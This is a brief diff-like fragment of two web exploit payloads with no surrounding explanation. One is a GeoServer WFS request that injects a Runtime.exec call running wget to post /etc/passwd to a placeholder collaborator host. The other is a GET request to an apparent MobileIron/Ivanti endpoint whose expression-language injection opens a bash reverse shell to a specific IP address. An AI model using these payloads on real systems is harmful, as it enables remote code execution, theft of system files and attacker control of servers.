@@ -1,1 +1,3 @@
 https://REDACTED. com/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=demo_examples%3Alanl_hex_chromium_shallow_2020&valueReference=exec(java.lang.Runtime.getRuntime(),%27wget+--post-file=/etc/passwd+YOUR_BURP_COLLABORATOR_ADDRESS_OR_INTERACTSH_HERE%27
+
+GET /mifs/rs/api/v2/featureusage?format=${"".getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('sh -i >& /dev/tcp/47.120.74.19/8080 0>&1')}
